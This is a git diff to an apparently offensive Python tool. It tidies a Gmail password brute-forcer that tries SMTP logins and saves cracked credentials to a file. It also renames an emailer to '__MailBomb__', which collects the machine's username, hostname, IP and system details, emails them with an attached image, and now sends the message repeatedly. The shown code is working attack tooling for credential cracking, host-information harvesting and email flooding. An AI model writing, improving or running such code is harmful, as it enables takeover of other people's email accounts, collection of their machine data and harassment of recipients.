@@ -46,9 +46,9 @@ def __MailBrute__():
                 server.login(gmail, password)
                 sleep(1)
                 print()
-                print(f'\033[92;1m [+] Email: {gmail} - Password founded: {password} \033[0m')
+                print(f'\033[92;1m [+] Email: {gmail} - Password found: {password} \033[0m')
                 with open('password.txt', 'at+', encoding='utf-8') as p: 
-                    p.write(f'[+] Email: {gmail} - Password founded: {password}\n')
+                    p.write(f'[+] Email: {gmail} - Password found: {password}\n')
 
                 break
 
@@ -57,9 +57,9 @@ def __MailBrute__():
                 if error[14] == '<':
                     sleep(1)
                     print()
-                    print(f'\033[92;1m [+] Email: {gmail} - Password founded: {password} \033[0m')
+                    print(f'\033[92;1m [+] Email: {gmail} - Password found: {password} \033[0m')
                     with open('password.txt', 'at+', encoding='utf-8') as p: 
-                        p.write(f'[+] Email: {gmail} - Password founded: {password}\n')
+                        p.write(f'[+] Email: {gmail} - Password found: {password}\n')
 
                     break
 
@@ -76,14 +76,21 @@ def __MailBrute__():
         print('[-] Email brute force finished!')
 
 
-def __MailSender__(send_email, rec_email, password): 
+def __MailBomb__(send_email, rec_email, password): 
     '''Send emails with computer informations, html messages and files'''
 
     # Computer Informations
     username = getpass.getuser()
     hostname = socket.gethostname()
     IPAddr = socket.gethostbyname(hostname)
-    inf = "{}\n{}\n\n> System.inf\n{}\n{}\n{}\n\n> Raw:\n{}".format(hostname,IPAddr,platform.node(),platform.system(),platform.processor(),platform.uname())
+    inf = "{}\n{}\n\n> System.inf\n{}\n{}\n{}\n\n> Raw:\n{}".format(
+        hostname,
+        IPAddr,
+        platform.node(),
+        platform.system(),
+        platform.processor(),
+        platform.uname()
+    )
 
     # Informations
     subject = f'Check The Message {username}.'
@@ -105,21 +112,20 @@ def __MailSender__(send_email, rec_email, password):
         </html>
     '''.format(inf), subtype='html')
 
-    ####### Send Files and Images #######
+    # Send Files and Images
+    files= ['.github/example.png']
+    for file in files: 
+        try: 
+            with open(file, 'rb') as f: 
+                file_data=f.read()
+                file_type=imghdr.what(f.name)
+                file_name=f.name
 
-    # files= ['directory/image.jpg']
-    # for file in files: 
-    #     try: 
-    #         with open(file, 'rb') as f: 
-    #             file_data=f.read()
-    #             file_type=imghdr.what(f.name)
-    #             file_name=f.name
+            msg.add_attachment(file_data, maintype = 'image', subtype=file_type, filename=file_name)
 
-    #         msg.add_attachment(file_data, maintype = 'image', subtype=file_type, filename=file_name)
-
-    #     except Exception as e: 
-    #         print()
-    #         print(f'\033[31m ![ERROR] {e}\033[0m')
+        except Exception as e: 
+            print()
+            print(f'\033[31m ![ERROR] {e}\033[0m')
 
     # Send the email
     try: 
@@ -127,7 +133,8 @@ def __MailSender__(send_email, rec_email, password):
             smtp.login(send_email, password)
             print(f'[+] Login in the email {send_email}')
             sleep(1)
-            smtp.send_message(msg)
+            for m in range(0, 2): 
+                smtp.send_message(msg)
             print('\033[1;32m [+] Email has been sent to {}\033[0m'.format(rec_email))
 
     except Exception as e: 
@@ -138,7 +145,7 @@ def __MailSender__(send_email, rec_email, password):
         print('[-] Email sender finished!')
 
 
-if __name__=='__main__': 
+def main(): 
     __start__()
     print()
     while True: 
@@ -159,7 +166,7 @@ if __name__=='__main__':
                 send_email = os.getenv('SEND_MAIL')
                 rec_email = os.getenv('REC_EMAIL')
                 password = getpass.getpass('[*] Enter your password: ')
-                __MailSender__(send_email, rec_email, password)
+                __MailBomb__(send_email, rec_email, password)
             else: 
                 print()
                 print('[!] Invalid answer.')
@@ -172,3 +179,7 @@ if __name__=='__main__':
         else: 
             print()
             print('[!] Invalid answer.')
+
+
+if __name__=='__main__': 
+    main()
